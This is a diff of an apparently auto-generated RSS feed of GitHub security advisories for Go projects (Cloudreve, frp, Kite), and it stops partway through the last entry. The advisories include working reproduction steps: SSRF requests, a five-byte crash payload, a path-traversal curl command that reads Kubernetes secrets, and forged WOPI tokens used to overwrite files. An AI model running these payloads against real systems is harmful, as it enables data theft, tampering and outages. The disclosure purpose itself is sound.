@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-24T21:16:34.669Z</updated>
+    <updated>2026-07-24T22:29:06.442Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,697 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cloudreve/Cloudreve/v3] Cloudreve Admin.Read OAuth tokens can trigger server-side node test requests]]></title>
+        <id>https://github.com/advisories/GHSA-v6w6-358x-2433</id>
+        <link href="https://github.com/advisories/GHSA-v6w6-358x-2433"/>
+        <updated>2026-07-24T21:50:25.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Cloudreve exposes two admin node test endpoints under the <code>Admin.Read</code> OAuth scope. These endpoints accept attacker-controlled node definitions and cause Cloudreve to make outbound server-side network requests. This allows an OAuth client authorized only for <code>Admin.Read</code> to trigger operational network actions that should require <code>Admin.Write</code>.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who obtains an admin-authorized OAuth token with <code>Admin.Read</code> but not <code>Admin.Write</code> can make the Cloudreve server connect to arbitrary URLs supplied in the request body. This can be used for blind SSRF, internal service probing, and triggering signed Cloudreve slave-style requests to attacker-chosen endpoints.</p>
+<h2 id="affected-version">Affected version</h2>
+<p>Verified in source and runtime on latest master commit <code>ba2e870bbd17f1918dd2321de861e453f696d6a3</code> and latest observed tag <code>4.16.1</code>.</p>
+<h2 id="technical-details">Technical details</h2>
+<p>The authenticated admin route group requires only <code>Admin.Read</code>:</p>
+<pre><code class="language-go">auth := v4.Group("")
+auth.Use(middleware.LoginRequired())
+auth.Use(middleware.RequiredScopes(types.ScopeAdminRead))
+admin := auth.Group("admin", middleware.IsAdmin())
+</code></pre>
+<p>The following routes are registered without <code>ScopeAdminWrite</code>:</p>
+<pre><code class="language-go">node.POST("test",
+    controllers.FromJSON[adminsvc.TestNodeService](adminsvc.TestNodeParamCtx{}),
+    controllers.AdminTestSlave,
+)
+node.POST("test/downloader",
+    controllers.FromJSON[adminsvc.TestNodeDownloaderService](adminsvc.TestNodeDownloaderParamCtx{}),
+    controllers.AdminTestDownloader,
+)
+</code></pre>
+<p>By contrast, node create, update, and delete routes do require <code>Admin.Write</code>:</p>
+<pre><code class="language-go">node.PUT("", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
+node.PUT(":id", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
+node.DELETE(":id", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
+</code></pre>
+<p><code>TestNodeService.Test()</code> parses the attacker-supplied node server and sends a request to it:</p>
+<pre><code class="language-go">slave, err := url.Parse(service.Node.Server)
+...
+res, err := r.Request(
+    "POST",
+    routes.SlavePingRoute(slave),
+    bytes.NewReader(bodyByte),
+    ...
+)
+</code></pre>
+<p><code>TestNodeDownloaderService.Test()</code> constructs a downloader from attacker-supplied node settings and invokes its network test method.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>The following was verified against a disposable Cloudreve instance built from the affected commit.</p>
+<p>Prerequisite: an admin user authorizes an OAuth client with <code>Admin.Read</code> but not <code>Admin.Write</code>.</p>
+<ol>
+<li>Obtain an OAuth access token whose scope is only:</li>
+</ol>
+<pre><code class="language-text">openid Admin.Read
+</code></pre>
+<p>The returned token response contains:</p>
+<pre><code class="language-json">{
+  "token_type": "Bearer",
+  "scope": "openid Admin.Read"
+}
+</code></pre>
+<ol start="2">
+<li>Confirm the token cannot perform an <code>Admin.Write</code> node operation:</li>
+</ol>
+<pre><code class="language-http">PUT /api/v4/admin/node HTTP/1.1
+Authorization: Bearer &lt;admin-read-oauth-token&gt;
+Content-Type: application/json
+
+{
+  "node": {
+    "name": "deny-control",
+    "server": "http://127.0.0.1:18080",
+    "type": "slave",
+    "slave_key": "poc"
+  }
+}
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-json">{
+  "code": 40089,
+  "msg": "Insufficient scope: Admin.Write"
+}
+</code></pre>
+<ol start="3">
+<li>Use the same <code>Admin.Read</code>-only OAuth token to call the node test endpoint with an attacker-controlled server URL:</li>
+</ol>
+<pre><code class="language-http">POST /api/v4/admin/node/test HTTP/1.1
+Authorization: Bearer &lt;admin-read-oauth-token&gt;
+Content-Type: application/json
+
+{
+  "node": {
+    "id": 124,
+    "name": "ssrf-poc",
+    "server": "http://127.0.0.1:18080",
+    "type": "slave",
+    "slave_key": "attacker-controlled-key"
+  }
+}
+</code></pre>
+<p>Observed Cloudreve response:</p>
+<pre><code class="language-json">{
+  "code": 0,
+  "msg": ""
+}
+</code></pre>
+<ol start="4">
+<li>The canary server at <code>127.0.0.1:18080</code> received the backend request:</li>
+</ol>
+<pre><code class="language-http">POST /api/v4/slave/ping HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Cloudreve/4.14.0
+Authorization: Bearer Cr &lt;hmac-signature&gt;:&lt;timestamp&gt;
+X-Cr-Node-Id: 124
+X-Cr-Site-Url: http://127.0.0.1:15212
+Content-Length: 37
+
+{"callback":"http://127.0.0.1:15212"}
+</code></pre>
+<p>This proves the <code>Admin.Read</code>-only OAuth token is denied on a sibling <code>Admin.Write</code> route but can still trigger a server-side request to an attacker-selected node URL through the test route.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>The route group enforces <code>Admin.Read</code> by default and relies on per-route <code>Admin.Write</code> middleware for operations that mutate state or perform operational side effects. The node test endpoints were omitted from the <code>Admin.Write</code> set even though they execute server-side network actions using attacker-supplied configuration.</p>
+<h2 id="remediation">Remediation</h2>
+<ul>
+<li>Add <code>middleware.RequiredScopes(types.ScopeAdminWrite)</code> to both node test routes.</li>
+<li>Consider applying SSRF validation or network egress controls to all admin-supplied test URLs.</li>
+<li>Audit other admin test endpoints for read-scoped side effects.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cloudreve/cloudreve/security/advisories/GHSA-v6w6-358x-2433">https://github.com/cloudreve/cloudreve/security/advisories/GHSA-v6w6-358x-2433</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/commit/332a9d800205082a2469e555fd66a63f18d9d5dc">https://github.com/cloudreve/cloudreve/commit/332a9d800205082a2469e555fd66a63f18d9d5dc</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/releases/tag/4.17.0">https://github.com/cloudreve/cloudreve/releases/tag/4.17.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-v6w6-358x-2433">https://github.com/advisories/GHSA-v6w6-358x-2433</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v6w6-358x-2433</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T21:50:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cloudreve/Cloudreve/v4] Cloudreve Admin.Read OAuth tokens can trigger server-side node test requests]]></title>
+        <id>https://github.com/advisories/GHSA-v6w6-358x-2433</id>
+        <link href="https://github.com/advisories/GHSA-v6w6-358x-2433"/>
+        <updated>2026-07-24T21:50:25.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Cloudreve exposes two admin node test endpoints under the <code>Admin.Read</code> OAuth scope. These endpoints accept attacker-controlled node definitions and cause Cloudreve to make outbound server-side network requests. This allows an OAuth client authorized only for <code>Admin.Read</code> to trigger operational network actions that should require <code>Admin.Write</code>.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who obtains an admin-authorized OAuth token with <code>Admin.Read</code> but not <code>Admin.Write</code> can make the Cloudreve server connect to arbitrary URLs supplied in the request body. This can be used for blind SSRF, internal service probing, and triggering signed Cloudreve slave-style requests to attacker-chosen endpoints.</p>
+<h2 id="affected-version">Affected version</h2>
+<p>Verified in source and runtime on latest master commit <code>ba2e870bbd17f1918dd2321de861e453f696d6a3</code> and latest observed tag <code>4.16.1</code>.</p>
+<h2 id="technical-details">Technical details</h2>
+<p>The authenticated admin route group requires only <code>Admin.Read</code>:</p>
+<pre><code class="language-go">auth := v4.Group("")
+auth.Use(middleware.LoginRequired())
+auth.Use(middleware.RequiredScopes(types.ScopeAdminRead))
+admin := auth.Group("admin", middleware.IsAdmin())
+</code></pre>
+<p>The following routes are registered without <code>ScopeAdminWrite</code>:</p>
+<pre><code class="language-go">node.POST("test",
+    controllers.FromJSON[adminsvc.TestNodeService](adminsvc.TestNodeParamCtx{}),
+    controllers.AdminTestSlave,
+)
+node.POST("test/downloader",
+    controllers.FromJSON[adminsvc.TestNodeDownloaderService](adminsvc.TestNodeDownloaderParamCtx{}),
+    controllers.AdminTestDownloader,
+)
+</code></pre>
+<p>By contrast, node create, update, and delete routes do require <code>Admin.Write</code>:</p>
+<pre><code class="language-go">node.PUT("", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
+node.PUT(":id", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
+node.DELETE(":id", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
+</code></pre>
+<p><code>TestNodeService.Test()</code> parses the attacker-supplied node server and sends a request to it:</p>
+<pre><code class="language-go">slave, err := url.Parse(service.Node.Server)
+...
+res, err := r.Request(
+    "POST",
+    routes.SlavePingRoute(slave),
+    bytes.NewReader(bodyByte),
+    ...
+)
+</code></pre>
+<p><code>TestNodeDownloaderService.Test()</code> constructs a downloader from attacker-supplied node settings and invokes its network test method.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>The following was verified against a disposable Cloudreve instance built from the affected commit.</p>
+<p>Prerequisite: an admin user authorizes an OAuth client with <code>Admin.Read</code> but not <code>Admin.Write</code>.</p>
+<ol>
+<li>Obtain an OAuth access token whose scope is only:</li>
+</ol>
+<pre><code class="language-text">openid Admin.Read
+</code></pre>
+<p>The returned token response contains:</p>
+<pre><code class="language-json">{
+  "token_type": "Bearer",
+  "scope": "openid Admin.Read"
+}
+</code></pre>
+<ol start="2">
+<li>Confirm the token cannot perform an <code>Admin.Write</code> node operation:</li>
+</ol>
+<pre><code class="language-http">PUT /api/v4/admin/node HTTP/1.1
+Authorization: Bearer &lt;admin-read-oauth-token&gt;
+Content-Type: application/json
+
+{
+  "node": {
+    "name": "deny-control",
+    "server": "http://127.0.0.1:18080",
+    "type": "slave",
+    "slave_key": "poc"
+  }
+}
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-json">{
+  "code": 40089,
+  "msg": "Insufficient scope: Admin.Write"
+}
+</code></pre>
+<ol start="3">
+<li>Use the same <code>Admin.Read</code>-only OAuth token to call the node test endpoint with an attacker-controlled server URL:</li>
+</ol>
+<pre><code class="language-http">POST /api/v4/admin/node/test HTTP/1.1
+Authorization: Bearer &lt;admin-read-oauth-token&gt;
+Content-Type: application/json
+
+{
+  "node": {
+    "id": 124,
+    "name": "ssrf-poc",
+    "server": "http://127.0.0.1:18080",
+    "type": "slave",
+    "slave_key": "attacker-controlled-key"
+  }
+}
+</code></pre>
+<p>Observed Cloudreve response:</p>
+<pre><code class="language-json">{
+  "code": 0,
+  "msg": ""
+}
+</code></pre>
+<ol start="4">
+<li>The canary server at <code>127.0.0.1:18080</code> received the backend request:</li>
+</ol>
+<pre><code class="language-http">POST /api/v4/slave/ping HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Cloudreve/4.14.0
+Authorization: Bearer Cr &lt;hmac-signature&gt;:&lt;timestamp&gt;
+X-Cr-Node-Id: 124
+X-Cr-Site-Url: http://127.0.0.1:15212
+Content-Length: 37
+
+{"callback":"http://127.0.0.1:15212"}
+</code></pre>
+<p>This proves the <code>Admin.Read</code>-only OAuth token is denied on a sibling <code>Admin.Write</code> route but can still trigger a server-side request to an attacker-selected node URL through the test route.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>The route group enforces <code>Admin.Read</code> by default and relies on per-route <code>Admin.Write</code> middleware for operations that mutate state or perform operational side effects. The node test endpoints were omitted from the <code>Admin.Write</code> set even though they execute server-side network actions using attacker-supplied configuration.</p>
+<h2 id="remediation">Remediation</h2>
+<ul>
+<li>Add <code>middleware.RequiredScopes(types.ScopeAdminWrite)</code> to both node test routes.</li>
+<li>Consider applying SSRF validation or network egress controls to all admin-supplied test URLs.</li>
+<li>Audit other admin test endpoints for read-scoped side effects.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cloudreve/cloudreve/security/advisories/GHSA-v6w6-358x-2433">https://github.com/cloudreve/cloudreve/security/advisories/GHSA-v6w6-358x-2433</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/commit/332a9d800205082a2469e555fd66a63f18d9d5dc">https://github.com/cloudreve/cloudreve/commit/332a9d800205082a2469e555fd66a63f18d9d5dc</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/releases/tag/4.17.0">https://github.com/cloudreve/cloudreve/releases/tag/4.17.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-v6w6-358x-2433">https://github.com/advisories/GHSA-v6w6-358x-2433</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v6w6-358x-2433</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T21:50:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/fatedier/frp] frp: Unauthenticated Remote Denial of Service in the frp SSH Tunnel Gateway via Integer Overflow]]></title>
+        <id>https://github.com/advisories/GHSA-26gq-p25f-99cp</id>
+        <link href="https://github.com/advisories/GHSA-26gq-p25f-99cp"/>
+        <updated>2026-07-24T21:48:05.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An integer-overflow vulnerability in the frp server's optional SSH Tunnel Gateway lets any unauthenticated remote attacker crash the entire <code>frps</code> process with a single five-byte message. When the gateway parses an SSH <code>exec</code> channel request in <code>pkg/ssh/server.go</code>, it adds a small constant to a four-byte length value taken directly from the request. Because that length is fully attacker-controlled, a value of <code>0xFFFFFFFF</code> makes the addition wrap around to a tiny number, defeating the only bounds check and forcing an out-of-range slice. Go raises a panic that nothing recovers, so the whole server exits. In the default gateway mode SSH clients are not authenticated and the request is handled before any frp token is checked, so the crash is reachable pre-authentication. It carries no state and is trivially repeatable, turning one crash into a sustained outage that drops every tunnel for every user.</p>
+<h2 id="details">Details</h2>
+<p>The <code>exec</code> request payload is a four-byte big-endian length followed by that many command bytes, and the length field is fully attacker-controlled. The gateway computes the end of the command as <code>4 + length</code>. The constant <code>4</code> takes the <code>uint32</code> type of the length field, so <code>4 + 0xFFFFFFFF</code> wraps modulo 2^32 to <code>3</code>. The only guard compares the real payload size against this wrapped value, so a five-byte payload passes the test <code>5 &lt; 3</code>, and the slice runs from index 4 to index 3:</p>
+<pre><code class="language-go">// pkg/ssh/server.go:315-319
+end := 4 + binary.BigEndian.Uint32(req.Payload[:4])  // 4 + 0xFFFFFFFF wraps to 3
+if len(req.Payload) &lt; int(end) {                     // 5 &lt; 3 is false, so it passes
+    continue
+}
+extraPayload := string(req.Payload[4:end])           // payload[4:3] -&gt; panic
+</code></pre>
+<p>The handler runs in a bare goroutine and no function in the call chain installs a <code>recover</code>, so the panic unwinds to the top of the goroutine and terminates the whole process rather than the single connection:</p>
+<pre><code class="language-go">// pkg/ssh/server.go:226
+go s.handleNewChannel(newChannel, extraPayloadCh)    // no recover anywhere in the chain
+</code></pre>
+<p>The sink is reachable without credentials in the default configuration. When no authorized-keys file is set, the gateway disables SSH client authentication, which is the default and documented mode where users authenticate through the frp token embedded in the SSH command. The <code>exec</code> request is processed during the channel phase, before that token is validated, so an unauthenticated peer reaches the sink:</p>
+<pre><code class="language-go">// pkg/ssh/gateway.go:74
+sshConfig.NoClientAuth = cfg.AuthorizedKeysFile == ""  // default: no client auth
+</code></pre>
+<p>Affected product: frp (fatedier), <code>frps</code> server, SSH Tunnel Gateway
+Affected versions: v0.53.0 (when the gateway was introduced) through v0.70.0, confirmed against a v0.70.0 build</p>
+<h2 id="poc">PoC</h2>
+<p>The SSH Tunnel Gateway must be enabled with no authorized-keys file, which is the default mode of any deployment that turns the gateway on. No credentials and no knowledge of the target are required.</p>
+<p>Enable the gateway on a stock v0.70.0 build:</p>
+<pre><code class="language-toml">bindPort = 7000
+
+[sshTunnelGateway]
+bindPort = 2200
+</code></pre>
+<p>As an unauthenticated SSH client, open a session channel and send one <code>exec</code> request whose four-byte length prefix is <code>0xFFFFFFFF</code> followed by a single byte, giving the five-byte payload <code>ff ff ff ff 41</code>. The server immediately panics and exits:</p>
+<pre><code class="language-text">panic: runtime error: slice bounds out of range [4:3]
+...github.com/fatedier/frp/pkg/ssh.(*TunnelServer).handleNewChannel
+    .../frp/pkg/ssh/server.go:319
+</code></pre>
+<p>The shell prompt returns in the server terminal, confirming the whole process has terminated and every other client tunnel is dropped at the same instant. A well-formed request of the same length (prefix <code>1</code>) leaves the server running, proving the crash is caused by the overflow value and not by the <code>exec</code> request itself. The attacker can re-send the payload after any restart to hold the server down indefinitely.</p>
+<h2 id="impact">Impact</h2>
+<p>This is an unauthenticated remote denial of service (CWE-190) leading to an out-of-range array index (CWE-129) and an unhandled process crash (CWE-755). A single five-byte, credential-free message kills the entire <code>frps</code> process. Because one <code>frps</code> commonly multiplexes the tunnels of many clients, the crash drops every active tunnel for every tenant at once and new logins are refused until the process is restarted, and re-sending the payload after each restart keeps the service down indefinitely (CWE-400). There is no confidentiality or integrity impact and no code execution.</p>
+<p>This issue only affects frps instances with the SSH tunnel gateway explicitly enabled. The SSH tunnel gateway is disabled by default and is not commonly used in typical frps deployments. Default frps configurations are not affected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/fatedier/frp/security/advisories/GHSA-26gq-p25f-99cp">https://github.com/fatedier/frp/security/advisories/GHSA-26gq-p25f-99cp</a></li>
+<li><a href="https://github.com/fatedier/frp/pull/5428">https://github.com/fatedier/frp/pull/5428</a></li>
+<li><a href="https://github.com/fatedier/frp/commit/7dc7be930e2452ae93fd32f2a77f8c6fcd0b652b">https://github.com/fatedier/frp/commit/7dc7be930e2452ae93fd32f2a77f8c6fcd0b652b</a></li>
+<li><a href="https://github.com/fatedier/frp/releases/tag/v0.70.1">https://github.com/fatedier/frp/releases/tag/v0.70.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-26gq-p25f-99cp">https://github.com/advisories/GHSA-26gq-p25f-99cp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-26gq-p25f-99cp</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-24T21:48:04.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zxh326/kite] Kite Kubernetes proxy path traversal allows authenticated users to bypass RBAC and read cluster-wide resources]]></title>
+        <id>https://github.com/advisories/GHSA-c534-2w9c-x7fm</id>
+        <link href="https://github.com/advisories/GHSA-c534-2w9c-x7fm"/>
+        <updated>2026-07-24T21:47:19.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Kite versions 0.6.9 through 0.14.0 authorize Kubernetes proxy requests against the pod or service identified by the original route parameters. Encoded path traversal segments can cause the upstream URL to resolve to a different Kubernetes API endpoint after authorization.</p>
+<h2 id="impact">Impact</h2>
+<p>An authenticated user with <code>get</code> permission on pods or services in one namespace can cause Kite to issue GET requests to Kubernetes API endpoints outside that namespace using Kite's service account.</p>
+<p>With Kite's default Helm RBAC configuration, this allows cluster-wide resource disclosure, including Secrets. The validated impact is confidentiality only; resource modification and denial of service were not demonstrated.</p>
+<p>Deployments using a restricted Kite service account are affected only up to the permissions granted to that service account.</p>
+<h2 id="technical-details">Technical details</h2>
+<p>The authorization check is performed against the original namespace and kind route parameters. The proxy path is subsequently decoded and passed to <code>url.JoinPath</code>, which resolves <code>..</code> segments and can produce an upstream URL outside the authorized pod or service proxy prefix.</p>
+<p>Two input locations were affected:</p>
+<ol>
+<li>Encoded traversal segments in the proxy catch-all path.</li>
+<li>Encoded traversal and slash characters in the resource name.</li>
+</ol>
+<h2 id="reproduction">Reproduction</h2>
+<ol>
+<li>Create a user with a role granting only <code>pods:get</code> in namespace <code>default</code>.</li>
+<li>Create any pod in <code>default</code> (e.g. <code>nginx</code>).</li>
+<li>Send the following request (auth cookie required):</li>
+</ol>
+<pre><code class="language-bash">curl --path-as-is --cookie "auth_token=&lt;JWT&gt;" \
+  'http://&lt;kite-host&gt;/api/v1/_clusters/&lt;cluster&gt;/namespaces/default/pods/nginx/proxy/%2e%2e/%2e%2e/%2e%2e/%2e%2e/kube-system/secrets'
+</code></pre>
+<h2 id="patches">Patches</h2>
+<p>Fixed in Kite 0.14.1.</p>
+<ul>
+<li><a href="https://github.com/kite-org/kite/releases/tag/v0.14.1">https://github.com/kite-org/kite/releases/tag/v0.14.1</a></li>
+</ul>
+<h2 id="workarounds">Workarounds</h2>
+<p>Upgrade to 0.14.1 or later.</p>
+<p>If upgrading is temporarily impossible, reject encoded dot segments and encoded slashes at the reverse proxy and restrict Kite's Kubernetes service account permissions. Reverse-proxy normalization should not be treated as a permanent fix.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/kite-org/kite/security/advisories/GHSA-c534-2w9c-x7fm">https://github.com/kite-org/kite/security/advisories/GHSA-c534-2w9c-x7fm</a></li>
+<li><a href="https://github.com/kite-org/kite/pull/638">https://github.com/kite-org/kite/pull/638</a></li>
+<li><a href="https://github.com/kite-org/kite/commit/08116eed557f8d6982cc83af0b02991e0f3577d5">https://github.com/kite-org/kite/commit/08116eed557f8d6982cc83af0b02991e0f3577d5</a></li>
+<li><a href="https://github.com/kite-org/kite/commit/69ad938937af8f375a2e183d1a331926ab851d98">https://github.com/kite-org/kite/commit/69ad938937af8f375a2e183d1a331926ab851d98</a></li>
+<li><a href="https://github.com/kite-org/kite/releases/tag/v0.14.1">https://github.com/kite-org/kite/releases/tag/v0.14.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-c534-2w9c-x7fm">https://github.com/advisories/GHSA-c534-2w9c-x7fm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c534-2w9c-x7fm</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T21:47:16.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cloudreve/Cloudreve/v3] Cloudreve WOPI view sessions can write files and WOPI access token secret is ignored]]></title>
+        <id>https://github.com/advisories/GHSA-c3jm-gv5r-9wcp</id>
+        <link href="https://github.com/advisories/GHSA-c3jm-gv5r-9wcp"/>
+        <updated>2026-07-24T21:18:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Cloudreve WOPI access tokens are generated as <code>&lt;session-id&gt;.&lt;random-secret&gt;</code>, but the WOPI middleware validates only the session id prefix and never compares the supplied token to the stored token. In addition, a WOPI viewer session does not store or enforce the requested viewer action. A session created for a view or preview action can still call WOPI write routes if the underlying file is writable by the session user.</p>
+<h2 id="impact">Impact</h2>
+<p>A WOPI integration that is only expected to view a user's file can modify that file through the WOPI write endpoints. If the WOPI URL or session id leaks, the random token suffix does not protect the session because any suffix is accepted for an existing session id.</p>
+<p>This affects deployments that configure WOPI viewers for user files. The attacker primitive is strongest when a malicious or compromised WOPI viewer receives a view-only URL and then writes content back to Cloudreve.</p>
+<h2 id="affected-version">Affected version</h2>
+<p>Verified in source and runtime on latest master commit <code>ba2e870bbd17f1918dd2321de861e453f696d6a3</code> and latest observed tag <code>4.16.1</code>.</p>
+<h2 id="technical-details">Technical details</h2>
+<p>Cloudreve creates WOPI viewer sessions in <code>pkg/filemanager/manager/viewer.go</code>:</p>
+<pre><code class="language-go">sessionID := uuid.Must(uuid.NewV4()).String()
+token := util.RandStringRunesCrypto(128)
+sessionCache := &amp;ViewerSessionCache{
+    ID:       sessionID,
+    Uri:      file.Uri(false).String(),
+    UserID:   m.user.ID,
+    ViewerID: viewer.ID,
+    FileID:   file.ID(),
+    Version:  version,
+    Token:    fmt.Sprintf("%s.%s", sessionID, token),
+}
+</code></pre>
+<p>The token includes a 128-character random suffix, but <code>middleware.ViewerSessionValidation()</code> only uses the prefix before the dot:</p>
+<pre><code class="language-go">accessToken := strings.Split(c.Query(wopi.AccessTokenQuery), ".")
+if len(accessToken) != 2 {
+    ...
+}
+
+sessionRaw, exist := store.Get(manager.ViewerSessionCachePrefix + accessToken[0])
+</code></pre>
+<p>The middleware checks that the file id matches the loaded session, but it never compares <code>c.Query("access_token")</code> with <code>session.Token</code>. As a result, <code>&lt;valid-session-id&gt;.anything</code> is accepted.</p>
+<p>The WOPI routes are exposed without normal session authentication and rely on this middleware:</p>
+<pre><code class="language-go">wopi := noAuth.Group("file/wopi", middleware.HashID(hashid.FileID), middleware.ViewerSessionValidation())
+wopi.GET(":id", controllers.CheckFileInfo)
+wopi.GET(":id/contents", controllers.GetFile)
+wopi.POST(":id/contents", controllers.PutFile)
+wopi.POST(":id", controllers.ModifyFile)
+</code></pre>
+<p>The write routes are not protected by a session-level write check. <code>CreateViewerSessionService</code> accepts <code>preferred_action</code>, but <code>ViewerSessionCache</code> has no action or write-permission field and <code>CreateViewerSession</code> does not persist the chosen action. The requested action is only used to generate the WOPI source URL:</p>
+<pre><code class="language-go">wopiSrc, err := wopi.GenerateWopiSrc(c, s.PreferredAction, targetViewer, viewerSession)
+</code></pre>
+<p><code>WopiService.PutContent()</code> checks only the underlying filesystem upload capability:</p>
+<pre><code class="language-go">file, err := m.Get(c, uri, dbfs.WithRequiredCapabilities(dbfs.NavigatorCapabilityUploadFile), dbfs.WithNotRoot())
+</code></pre>
+<p>It does not check whether the WOPI session was created for an edit action.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>The following sequence was verified against a disposable local Cloudreve instance built from the affected commit.</p>
+<ol>
+<li>Configure a WOPI viewer in Cloudreve.</li>
+<li>Create a user-owned file, for example <code>cloudreve://my/wopi.txt</code>, containing <code>original content</code>.</li>
+<li>Create a viewer session with <code>preferred_action</code> set to <code>view</code>:</li>
+</ol>
+<pre><code class="language-http">PUT /api/v4/file/viewerSession HTTP/1.1
+Authorization: Bearer &lt;user-token&gt;
+Content-Type: application/json
+
+{
+  "uri": "cloudreve://my/wopi.txt",
+  "version": "",
+  "viewer_id": "poc-wopi",
+  "preferred_action": "view"
+}
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-json">{
+  "session": {
+    "id": "a2d03f1b-e310-4b2a-9baf-38556fa2d5d1",
+    "access_token": "a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.&lt;128-char-random-secret&gt;"
+  }
+}
+</code></pre>
+<ol start="4">
+<li>Replace the token suffix with any value:</li>
+</ol>
+<pre><code class="language-http">GET /api/v4/file/wopi/4xc5?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
+</code></pre>
+<p>Observed response: <code>200 OK</code>. The same request with an unknown session id returned <code>403 Forbidden</code>, confirming the middleware validates the session id prefix but ignores the secret suffix.</p>
+<ol start="5">
+<li>Use the forged token from the view-created session to read content:</li>
+</ol>
+<pre><code class="language-http">GET /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Content-Length: 16
+Etag: "1bIo"
+
+original content
+</code></pre>
+<ol start="6">
+<li>Use the same forged token from the view-created session to write content:</li>
+</ol>
+<pre><code class="language-http">POST /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
+X-WOPI-Lock: cloudreve-poc
+Content-Type: application/octet-stream
+
+runtime modified via view session forged suffix
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+X-Wopi-Itemversion: nBc0
+</code></pre>
+<ol start="7">
+<li>Read back the modified file with the forged token:</li>
+</ol>
+<pre><code class="language-http">GET /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Content-Length: 47
+Etag: "nBc0"
+
+runtime modified via view session forged suffix
+</code></pre>
+<p>This proves both authorization failures: the random token suffix is ignored, and a view-created WOPI session can reach the content write sink.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>Two authorization values are generated or accepted but not enforced:</p>
+<ol>
+<li>The random WOPI token suffix is generated and stored but never compared during WOPI request validation.</li>
+<li>The requested WOPI action is accepted during session creation but not persisted or enforced on WOPI write routes.</li>
+</ol>
+<h2 id="remediation">Remediation</h2>
+<ul>
+<li>Compare the full supplied <code>access_token</code> to the stored <code>ViewerSessionCache.Token</code> using constant-time comparison.</li>
+<li>Reject malformed tokens and tokens with extra separators.</li>
+<li>Store a <code>CanWrite</code> flag or selected WOPI action in <code>ViewerSessionCache</code>.</li>
